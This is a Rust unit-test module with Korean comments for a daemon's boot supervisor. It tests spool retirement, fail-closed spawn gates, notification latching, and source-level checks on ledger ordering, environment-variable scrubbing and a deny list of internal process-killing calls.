        let _ = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0 + HB_STALL_SECS * 10.0);
        let after = BootIntent::from_str("n", &std::fs::read_to_string(intent_path(&dir, "n")).unwrap())
            .expect("판독 불가");
        assert_eq!(
            after.generation, 1,
            "미보고 런이 fence 됐다 — hb 미배선을 러너 사망으로 오독했다"
        );
    }

    // ── (P2) 신설 계약 검체 ────────────────────────────────────────────────────

    /// ★(R3-RISK-1) kill-switch 게이트 — pause 중에는 낳지도 지우지도 않는다.
    #[test]
    fn paused_daemon_freezes_the_supervisor_tick() {
        let d = tmp_daemon("paused");
        let dir = tmp_spool("paused");
        enqueue_in(&dir, &req("p", None), 0.0).unwrap();
        let mut st = SupState::default();
        d.paused.store(true, Ordering::SeqCst);
        for _ in 0..5 {
            assert_eq!(
                tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0),
                0,
                "pause 중에 감독자가 프로세스를 낳았다(kill-switch 관통)"
            );
        }
        assert!(intent_path(&dir, "p").exists(), "pause 중에 스풀을 건드렸다");
        // 재개하면 종전 그대로 낳는다 — 게이트는 동결이지 폐기가 아니다.
        d.paused.store(false, Ordering::SeqCst);
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 2.0), 1);
    }

    /// ★(R3-P2-5) 전제 붕괴(claim_stale)는 재시도가 아니라 **폐기**다 — 남은 예산을 태우며
    /// 같은 판정을 반복하지 않는다(무스폰·이벤트 1건·인텐트 제거).
    #[test]
    fn claim_stale_retires_immediately_without_retry() {
        let d = tmp_daemon("stale");
        let dir = tmp_spool("stale");
        enqueue_in(&dir, &req("c", Some(7)), 0.0)
            .unwrap();
        let mut st = SupState::default();
        let mut total = 0usize;
        let mut now = 1.0;
        for _ in 0..20 {
            total += tick_in(&d, &dir, &mut st, stale_runner, remove_spool_file, now);
            now += 60.0; // 쿨다운을 계속 넘겨 준다 — 재시도 계급이라면 3회까지 갔을 것.
        }
        assert_eq!(total, 1, "claim_stale 이 재시도 계급으로 접혔다({total}회 디스패치)");
        assert!(!intent_path(&dir, "c").exists(), "claim_stale 인텐트가 스풀에 남았다");
    }

    /// ★(R3-P2-5) 프로덕션 실행자의 레지스트리 재실측 게이트 — roles 에 master 가 없으면
    /// (또는 다른 surface 가 쥐면) 스폰 없이 `Retire("claim_stale")` 로 돌아온다.
    /// (성공 leg 는 실 스폰이라 여기서 재지 않는다 — 순수 판정은 아래 진리표가 전수한다.)
    #[test]
    fn run_ensure_team_refuses_a_stale_claim_before_any_spawn() {
        let d = tmp_daemon("regate");
        let mut it = intent("r");
        it.surface_id = Some(7); // 등록된 surface 도, master 보유도 없다.
        it.created_at = 0.0;
        it.decl_origin = DECL_ORIGIN_HOOK_HUMAN.into();
        it.claim_rc = Some(0);
        it.claim_at = Some(0.0);
        assert_eq!(
            run_ensure_team(&d, &it, BootAction::EnsureTeam),
            Err(RunErr::Retire("claim_stale")),
            "레지스트리가 부정하는 claim 으로 스폰 경로에 진입했다"
        );
    }

    /// ★(R4 수정 라운드) surface_id 부재 인텐트(스풀 직접 투하 계급)는 프로덕션 실행자가
    /// 스폰 없이 `Retire("no_surface")` 로 접는다 — 신원 env 0 스폰(rc6 ×MAX_ATTEMPTS)의
    /// 표면 축소. 정상 생산자(boot.enqueue)는 항상 Some(sid)이므로 프로덕션 경로 무손실.
    #[test]
    fn run_ensure_team_refuses_a_surfaceless_intent_before_any_spawn() {
        let d = tmp_daemon("nosurface");
        let mut it = intent("n");
        it.surface_id = None; // 유일 생산자(boot.enqueue)가 만들 수 없는 형상.
        it.created_at = 0.0;
        it.decl_origin = DECL_ORIGIN_HOOK_HUMAN.into();
        assert_eq!(
            run_ensure_team(&d, &it, BootAction::EnsureTeam),
            Err(RunErr::Retire("no_surface")),
            "신원 없는 인텐트가 스폰 경로에 진입했다 — fail-closed 게이트 미동작"
        );
    }

    /// (R3-P2-5) 재실측 순수 판정 진리표 — 보유 일치 ∧ 생존일 때만 참.
    #[test]
    fn master_holds_truth_table() {
        assert!(master_holds(Some(7), 7, true), "보유+생존이 거짓으로 판정됐다");
        assert!(!master_holds(Some(7), 7, false), "죽은 좌석의 claim 이 신선 판정됐다");
        assert!(!master_holds(Some(8), 7, true), "남이 쥔 master 가 내 claim 으로 판정됐다");
        assert!(!master_holds(None, 7, true), "빈 레지스트리가 보유로 판정됐다");
    }

    /// ★(P2-2 · ANCHOR-1 ④) PATH 선두 = 데몬 exe_dir — bare "cys" 해소 보장.
    /// 기존 PATH 는 순서 그대로 뒤에 보존된다(python3 등 후속 해소를 깨지 않는다).
    #[test]
    fn path_injection_puts_exe_dir_first_and_keeps_the_rest() {
        let exe = std::env::temp_dir().join("cys_bsup_exedir");
        let old = std::env::join_paths([Path::new("/usr/bin"), Path::new("/bin")]).unwrap();
        let joined = path_with_exe_dir_first(&exe, Some(old));
        let parts: Vec<PathBuf> = std::env::split_paths(&joined).collect();
        assert_eq!(parts.first(), Some(&exe), "exe_dir 가 PATH 선두가 아니다: {parts:?}");
        assert!(
            parts[1..].iter().any(|p| p == Path::new("/usr/bin"))
                && parts[1..].iter().any(|p| p == Path::new("/bin")),
            "기존 PATH 성분이 소실됐다: {parts:?}"
        );
        // PATH 부재(최소 env 데몬)에서도 exe_dir 한 조각은 반드시 남는다.
        let alone = path_with_exe_dir_first(&exe, None);
        assert_eq!(
            std::env::split_paths(&alone).next().as_ref(),
            Some(&exe),
            "PATH 부재에서 exe_dir 단독 주입이 안 됐다"
        );
    }

    /// boot-supervisor.log 회전 1겹 — 상한 초과에서만 `.1` 로 밀린다.
    #[test]
    fn log_rotation_is_one_layer_and_cap_gated() {
        let dir = tmp_spool("logrot");
        let log = dir.join("boot-supervisor.log");
        std::fs::write(&log, b"small").unwrap();
        rotate_log_if_huge(&log);
        assert!(log.exists(), "상한 미만 로그가 회전됐다");
        let big = vec![b'x'; (LOG_MAX_BYTES + 1) as usize];
        std::fs::write(&log, &big).unwrap();
        rotate_log_if_huge(&log);
        assert!(!log.exists(), "상한 초과 로그가 제자리에 남았다");
        assert!(dir.join("boot-supervisor.log.1").exists(), "회전본(.1)이 없다");
    }

    /// ★(오너 결정 ⑧c) 소진 종착은 loud 다 — 스폰 실패 소진 시 feed 통보가 나가고, 같은
    /// 인텐트가 이후 `attempts_exhausted` 폐기 지점을 다시 지나도 통보는 **1회로 접힌다**
    /// (삭제 실패 최악 형상: 두 관측 지점을 모두 지나는 경로).
    #[test]
    fn exhaustion_notification_fires_once_across_both_paths() {
        let d = tmp_daemon("loudonce");
        let dir = tmp_spool("loudonce");
        enqueue_in(&dir, &req("L", None), 0.0).unwrap();
        let mut st = SupState::default();
        let mut now = 1.0;
        for _ in 0..100 {
            // never_removes: 소진 후에도 파일이 남아 Retire(attempts_exhausted) 지점을 매 틱 지난다.
            tick_in(&d, &dir, &mut st, fail_runner, never_removes, now);
            now += 60.0;
        }
        let fails = d
            .feed_items
            .lock()
            .unwrap()
            .iter()
            .filter(|i| i.kind == "bootstrap-fail")
            .count();
        assert_eq!(fails, 1, "소진 통보가 1회로 접히지 않았다: {fails}건 (매 틱 반복 = 폭주)");
    }

    /// ★(오너 결정 ⑧c) 선언 surface 가 살아 있으면 — 원장 **선기록** 후 1줄 통보가 그 pane 으로
    /// 간다(Windows 포함 — cfg 게이트 없음). 원장(delivery ledger)에 통보 문안이 실재해야 한다.
    #[test]
    fn exhaustion_notice_reaches_the_declaring_surface_with_ledger_first() {
        let d = tmp_daemon("loudpane");
        let s = d
            .create_surface(None, Some("sleep 30".into()), None, None, 24, 80)
            .expect("test surface");
        d.surfaces.lock().unwrap().insert(s.id, s.clone());
        let dir = tmp_spool("loudpane");
        enqueue_in(&dir, &req("N", Some(s.id)), 0.0)
            .unwrap();
        let mut st = SupState::default();
        let mut now = 1.0;
        for _ in 0..10 {
            tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now);
            now += 60.0;
        }
        let items = d.feed_items.lock().unwrap();
        let item = items
            .iter()
            .find(|i| i.kind == "bootstrap-fail")
            .expect("소진 feed 통보 부재");
        assert_eq!(item.surface_id, Some(s.id), "통보의 선언 surface 귀속 소실");
        drop(items);
        // 원장은 전문이 아니라 preview(64자)+sha256 를 남긴다 — 문안 선두의 안정 마커로 판정.
        // ★마커 갱신(R2): 트리거가 '예산 소진'에서 '스폰 0회'로 넓어지며 문안 선두가 사유
        //   무관 공통구로 바뀌었다(사유는 뒤쪽 `no_spawn_reason` 분기).
        let ledger = std::fs::read_to_string(crate::delivery::ledger_path(&d.socket_path))
            .unwrap_or_default();
        assert!(
            ledger.contains("팀이 이 선언으로 뜨지 않았다"),
            "무스폰 통보가 원장 선기록 없이 나갔다(기계 push 오너 임무 오인 창) — 원장: {ledger:?}"
        );
    }

    /// ★(R2 must_fix) **스폰 0회 종착은 전부 loud 다** — 종전엔 `attempts_exhausted` 하나만
    /// 통보했고 `claim_stale` 은 버스 이벤트만 낸 채 사라졌다(frontdoor note 가 '소진 시 이
    /// 화면과 승인 Feed 로 통보한다'고 약속한 뒤의 침묵). 형제 검체
    /// `claim_stale_retires_immediately_without_retry` 는 '재시도 안 함'만 재고 통보 유무는
    /// 재지 않아 GREEN 을 유지했다 — 그 사각을 이 검체가 관통한다.
    #[test]
    fn claim_stale_retire_is_loud_not_silent() {
        let d = tmp_daemon("staleloud");
        let dir = tmp_spool("staleloud");
        enqueue_in(&dir, &req("c", Some(7)), 0.0)
            .unwrap();
        let mut st = SupState::default();
        let mut now = 1.0;
        for _ in 0..10 {
            tick_in(&d, &dir, &mut st, stale_runner, remove_spool_file, now);
            now += 60.0;
        }
        let items = d.feed_items.lock().unwrap();
        let hits: Vec<_> = items.iter().filter(|i| i.kind == "bootstrap-fail").collect();
        assert_eq!(
            hits.len(),
            1,
            "claim_stale 폐기의 통보가 {}건이다(0=조용한 포기 / 2+=래치 파손)",
            hits.len()
        );
        assert!(
            hits[0].body.contains("claim_stale") && hits[0].body.contains("master"),
            "통보 문안이 사유를 말하지 않는다: {:?}",
            hits[0].body
        );
    }

    /// ★(R2 must_fix) `expired` 폐기도 loud 다 — kill-switch pause 가 30분을 넘겨 유지되면
    /// 재개 순간 전 인텐트가 이 갈래로 소각된다(도달 경로가 가장 현실적인 침묵 표면).
    ///
    /// 동시에 **채널 분리**를 잰다: 3건이 한꺼번에 만료돼도 ⓐ feed 통보는 3건 전부 나가고
    /// (조용히 사라지는 갈래 0) ⓑ 폐기는 통보 예산과 무관하게 같은 틱에 끝난다(GC 를 통보에
    /// 묶으면 쓰레기 스풀이 줄지 않는다) ⓒ 반복 틱이 통보를 늘리지 않는다(래치).
    #[test]
    fn expired_retire_is_loud_on_every_intent_and_gc_is_not_gated_by_notice() {
        let d = tmp_daemon("expired");
        let dir = tmp_spool("expired");
        for id in ["e1", "e2", "e3"] {
            enqueue_in(&dir, &req(id, None), 0.0)
                .unwrap();
        }
        let mut st = SupState::default();
        let now = INTENT_MAX_AGE_SECS + 10.0; // 전건 만료
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now), 0);
        let count_fails = |d: &Arc<Daemon>| {
            d.feed_items
                .lock()
                .unwrap()
                .iter()
                .filter(|i| i.kind == "bootstrap-fail")
                .count()
        };
        assert_eq!(
            count_fails(&d),
            3,
            "만료 폐기의 통보가 3건이 아니다 — 조용히 사라지는 갈래가 남았다"
        );
        for id in ["e1", "e2", "e3"] {
            assert!(
                !intent_path(&dir, id).exists(),
                "만료 인텐트 {id} 가 스풀에 남았다 — GC 가 통보 예산에 묶였다"
            );
        }
        tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now + 1.0);
        assert_eq!(count_fails(&d), 3, "반복 틱이 통보를 늘렸다(래치 파손)");
    }

    /// 데몬 재시작 픽업(스풀에 남은 소진 인텐트)도 조용한 폐기가 아니라 loud 종착이다.
    #[test]
    fn restart_pickup_of_exhausted_intent_is_loud() {
        let d = tmp_daemon("pickup");
        let dir = tmp_spool("pickup");
        raw_intent(
            &dir,
            "old",
            &format!(
                r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                    "created_at":1.0,"attempts":{MAX_ATTEMPTS},"next_attempt_at":0.0,"reason":"t"}}"#
            ),
        );
        let mut st = SupState::default();
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 2.0), 0);
        assert!(!intent_path(&dir, "old").exists(), "소진 인텐트가 스풀에 남았다");
        let fails = d
            .feed_items
            .lock()
            .unwrap()
            .iter()
            .filter(|i| i.kind == "bootstrap-fail")
            .count();
        assert_eq!(fails, 1, "재시작 픽업 소진이 조용히 폐기됐다(통보 {fails}건)");
    }

    /// 제거자의 성공 정의 — "이제 이 경로에 파일이 없다"(남이 먼저 지운 경우 포함).
    #[test]
    fn remover_reports_absence_as_success() {
        let dir = tmp_spool("remover");
        let p = dir.join("gone.json");
        assert!(remove_spool_file(&p), "이미 없는 경로는 성공이어야 한다");
        std::fs::write(&p, "x").unwrap();
        assert!(remove_spool_file(&p), "평범한 파일 삭제 실패");
        assert!(!p.exists());
    }

    // ── 소스 핀(관례: governance.rs `queue_delivery_single_helper_shared_by_tick_and_rpc`) ──

    /// 프로덕션 슬라이스에서 `//` 줄주석을 **제거**한다.
    ///
    /// 왜 필요한가: 아래 금칙어 핀은 "이 코드가 무엇을 **부르는가**"를 보는 장치인데, 주석은
    /// 부르는 것이 아니라 설명하는 것이다. 주석 한 줄로 핀이 적색이 되면 다음 사람은 핀을
    /// 완화하거나 설명을 지운다 — 둘 다 나쁘다. 반대로 주석 한 줄로 핀이 **초록**이 되는 일도
    /// 없어야 한다(그쪽이 더 위험하다). 그래서 판정 대상에서 주석을 통째로 뺀다.
    /// (문자열 리터럴 안의 `//` 까지 다루는 완전한 렉서가 아니다 — 이 파일에는 그런 리터럴이
    ///  없고, 생기면 아래 핀들이 곧바로 적색으로 알려 준다.)
    fn strip_line_comments(src: &str) -> String {
        src.lines()
            .map(|l| match l.find("//") {
                Some(i) => &l[..i],
                None => l,
            })
            .collect::<Vec<_>>()
            .join("\n")
    }

    /// ★불변식 — **원장 기록이 행위보다 앞**이다(`dispatch_one` 안에서 순서 역전 금지).
    #[test]
    fn ledger_record_precedes_the_action() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let prod = prod.as_str();
        let at = prod.find("fn dispatch_one(").expect("dispatch_one 소실");
        let body = &prod[at..];
        let rec = body.find("record_audited(").expect("감독자 원장 기록 지점 소실");
        let run = body.find("runner(daemon").expect("실행자 호출 지점 소실");
        assert!(
            rec < run,
            "원장 기록이 행위 뒤로 갔다 — 그 창에서 임무 게이트가 기계 push 를 오너 임무로 오인한다"
        );
        // ★핀 개정(P2 · 오너 결정 ⑧c — 약화 아님, 상한 이동): 무스폰 loud 통보(notify_no_spawn)
        //   도 pane 주입 전에 같은 유래(Origin::Supervisor)로 원장 선기록해야 하므로 지정 지점이
        //   dispatch_one + notify_no_spawn **정확히 2곳**이 됐다. 여전히 닫힌 집합 단언이다 —
        //   제3 지점 유입은 이 핀이 계속 적색으로 잡는다(구현 갈라짐 차단 목적 불변).
        assert_eq!(
            prod.matches("crate::delivery::Origin::Supervisor").count(),
            2,
            "감독자 원장 유래 지정 지점은 정확히 2곳(dispatch_one·notify_no_spawn)이어야 한다"
        );
        // notify_no_spawn 쪽도 순서 불변식이 같다 — 원장 기록이 주입(try_send)보다 앞.
        let nat = prod.find("fn notify_no_spawn(").expect("notify_no_spawn 소실");
        let nbody = &prod[nat..];
        let nrec = nbody.find("record_audited(").expect("소진 통보 원장 기록 지점 소실");
        let ninj = nbody.find("write_tx.try_send(").expect("소진 통보 주입 지점 소실");
        assert!(
            nrec < ninj,
            "소진 통보의 원장 기록이 주입 뒤로 갔다 — 기계 push 오너 임무 오인 창"
        );
    }

    /// ★(R2) provenance 상속 절단이 **실재 배선**인가 — 소스 단언.
    ///
    /// 판정이 '주지 않기로' 결론 낸 값은 상속되는 것이 아니라 **없어야 한다**. 조건부 `env`
    /// 만 있고 `env_remove` 가 없으면 데몬 env 오염(훅 자손 autostart 로 뜬 cysd 가 들고 있는
    /// `hook-human`·타 pane 토큰)이 그대로 자식에게 흘러 기계유래 게이트를 통과한 적 없는
    /// 인텐트가 부서 자동 생성 봉인을 연다. 배선은 두 줄이라 행위 검체를 세우기보다(실 스폰
    /// 필요) 소스로 못 박는 편이 정직하다.
    #[test]
    fn provenance_env_is_withheld_as_absent_not_inherited() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let at = prod.find("fn run_ensure_team(").expect("run_ensure_team 소실");
        let body = &prod[at..];
        for key in ["env_remove(\"CYS_DECL_ORIGIN\")", "env_remove(cys::ENV_SEAT_TOKEN)"] {
            assert!(
                body.contains(key),
                "run_ensure_team 에 {key} 가 없다 — 주입하지 않기로 한 값이 데몬 env 에서 \
                 상속된다(부서 자동 생성 봉인 무료 개방 · 타 pane 좌석 토큰 유출)"
            );
        }
        // 지우기가 조건부 주입보다 **앞**이어야 한다(뒤면 주입을 지운다).
        let rm = body.find("env_remove(\"CYS_DECL_ORIGIN\")").unwrap();
        let set = body
            .find("cmd.env(\"CYS_DECL_ORIGIN\", &it.decl_origin)")
            .expect("조건부 provenance 주입 소실");
        assert!(rm < set, "env_remove 가 조건부 주입 뒤로 갔다 — 주입을 지운다");
        assert!(
            body.contains("env(cys::ENV_ROLE, \"master\")"),
            "감독자 자식의 CYS_ROLE 이 명시되지 않았다 — pane 상속 role 이 master 부트의 \
             boot-last `role` 필드로 기록돼 §0-A 가 읽는 사실이 조용히 거짓이 된다"
        );
    }

    /// ★(R2 must_fix) **스폰 0회 종착의 닫힌 집합이 전부 loud 인가** — 소스 단언.
    ///
    /// 행위 검체(`claim_stale_retire_is_loud_not_silent`·`expired_retire_is_loud_…`)는 두
    /// 사유만 관통한다. 종착 갈래는 셋이고(판정 폐기 · 실행자 폐기 · 마지막 시도 실패),
    /// 새 갈래가 추가되면서 통보를 빠뜨리는 것이 정확히 R2 가 적발한 회귀 양식이라 **갈래
    /// 수 자체**를 못 박는다. 값이 바뀌어야 한다면 그건 계약 변경이고, 그때 이 주석과 함께
    /// 갱신하라(정직성 불변식: 훅 frontdoor note 의 '통보한다' 약속과 짝이다).
    #[test]
    fn every_no_spawn_terminal_is_loud() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let at = prod.find("fn tick_in(").expect("tick_in 소실");
        let body = &prod[at..];
        assert_eq!(
            body.matches("notify_no_spawn(").count(),
            3,
            "tick_in 의 무스폰 통보 지점이 3곳(판정 폐기·실행자 폐기·마지막 시도 실패)이 \
             아니다 — 종착 갈래가 늘었는데 통보를 빠뜨렸거나, 통보가 사라졌다"
        );
        // 판정 폐기 갈래에서는 **통보가 삭제보다 앞**이다(예산 부족 시 '조용히 지우기'가
        // 아니라 '이번 틱 건너뛰기'로 접히게 하는 순서 — R2 fix_direction 그대로).
        let arm = body
            .find("Disposition::Retire(why) => {")
            .expect("판정 폐기 갈래 소실");
        let arm_body = &body[arm..];
        let notify = arm_body.find("notify_no_spawn(").expect("판정 폐기 갈래의 통보 소실");
        let remove = arm_body.find("remove_and_gate(").expect("판정 폐기 갈래의 삭제 소실");
        assert!(
            notify < remove,
            "판정 폐기 갈래에서 삭제가 통보보다 앞이다 — 통보 예산이 마르면 조용히 지워진다"
        );
    }

    /// 파괴/재기동 어휘 — 감독자 코드에 **한 글자도** 있으면 안 되는 호출들.
    const DESTRUCTIVE: [&str; 7] = [
        "close_surface",
        "kill_on_drop(true)",
        "check_agent_death",
        "launch_via_cli",
        "restart_counts",
        "reap_",
        ".kill(",
    ];

    /// 금칙어 탐지기(주석 제거 후 판정). 반환 = 적발된 어휘 목록.
    fn destructive_hits(src_slice: &str) -> Vec<&'static str> {
        let code = strip_line_comments(src_slice);
        DESTRUCTIVE
            .iter()
            .copied()
            .filter(|w| code.contains(w))
            .collect()
    }

    /// ★롤백 스위치가 **실제 배선**이다 — `spawn` 이 판정을 먼저 하고 태스크 전에 빠져나간다.
    /// (순수 코어만 맞고 배선이 없으면 노브를 눌러도 감독자가 뜬다 = 롤백 사문.)
    #[test]
    fn rollback_switch_is_wired_before_the_task_is_spawned() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        let at = prod.find("pub fn spawn(").expect("spawn 소실");
        let body = &prod[at..];
        let judge = body.find("supervisor_off_from(").expect("롤백 판정 호출 소실");
        let ret = body.find("        return;").expect("조기 return(=미기동) 소실");
        let task = body.find("tokio::spawn(").expect("태스크 기동 지점 소실");
        assert!(
            judge < ret && ret < task,
            "롤백 판정이 태스크 기동보다 뒤다 — 노브를 눌러도 감독자가 뜬다(롤백 사문)"
        );
        // ★(P2 · R3-P2-4) 생존 플래그 set 은 조기 return **뒤** · 태스크 기동 **앞**이다.
        //   return 앞이면 꺼진 감독자가 살아있다고 주장하고(supervisor_off 스큐 재발),
        //   태스크 뒤면 기동 직후 enqueue 가 잠깐 거절된다(불필요한 legacy 폴백).
        let alive = body
            .find("supervisor_alive.store(true")
            .expect("감독자 생존 플래그 set 지점 소실(R3-P2-4 blocker 재발)");
        assert!(
            ret < alive && alive < task,
            "생존 플래그 set 위치가 계약(조기 return 뒤·태스크 기동 앞)을 벗어났다"
        );
        // ★R4 [1](codex BLOCK · master 심판): epoch 영속이 **생존 플래그보다 앞**이다.
        //   뒤로 가면 lease identity 를 디스크에 못 남긴 채로 dispatch 가 열린다 — 이 모듈이
        //   여러 곳에서 지키는 '못 남기면 낳지 않는다' 를 이 축에서만 어기는 셈이 된다.
        let epoch_at = body
            .find("bump_boot_epoch(")
            .expect("epoch 영속 호출 지점 소실(R4 [1] 재발)");
        assert!(
            ret < epoch_at && epoch_at < alive,
            "epoch 영속이 생존 플래그 뒤로 갔다 — 못 남긴 채로 감독자가 열린다"
        );
        // env 판독은 이 1지점뿐이다(축별 1지점 규약 — 판독 지점이 늘면 조합이 갈린다).
        assert_eq!(
            prod.matches("supervisor_off_from(").count(),
            2,
            "롤백 판정의 정의 1 + 호출 1 이어야 한다(판독 지점 산재 금지)"
        );
    }

    /// ★오살 금지 — 감독자는 **살아 있는 것을 죽이는 어떤 호출도** 하지 않는다.
    /// (설계서가 요구한 '예산 Daemon 필드 승격' 이 파일 반경 밖이라, 그 공유가 필요한 상황
    ///  자체를 만들지 않는 것으로 안전을 확보한다 — `Budget` 타입 주석 참조.)
    ///
    /// ★계측 타당성: 트리에 위반이 0 이면 탐지기가 고장나도 초록이다. 그래서 **합성 표본**으로
    /// 탐지 능력 자체를 함께 시험한다 — 금칙 호출을 코드에 심은 변조본에서 반드시 적발돼야 하고,
    /// 같은 문장을 **주석에** 넣은 변조본에서는 적발되지 않아야 한다(주석은 호출이 아니다).
    #[test]
    fn supervisor_never_kills_anything() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let hits = destructive_hits(raw);
        assert!(
            hits.is_empty(),
            "감독자에 파괴/재기동 경로가 들어왔다: {hits:?} — 오살이 오탐보다 훨씬 위험하다"
        );
        // 합성 표본 ① — 코드에 심으면 반드시 적발된다(탐지기 생존 증명).
        for w in DESTRUCTIVE {
            let mutant = format!("{raw}\nfn __mutant() {{ let _ = {w}; }}\n");
            assert_eq!(
                destructive_hits(&mutant),
                vec![w],
                "합성 변조본에서 금칙 호출 {w:?} 를 적발하지 못했다 = 탐지기 고장"
            );
        }
        // 합성 표본 ② — 주석에 있는 같은 문장은 적발하지 않는다(핀이 설명을 죽이지 않는다).
        let commented = format!("{raw}\n// 여기서 close_surface 를 부르면 안 된다\n");
        assert!(
            destructive_hits(&commented).is_empty(),
            "주석 문장을 위반으로 읽었다 — 다음 사람이 설명을 지우거나 핀을 완화하게 된다"
        );
    }
}
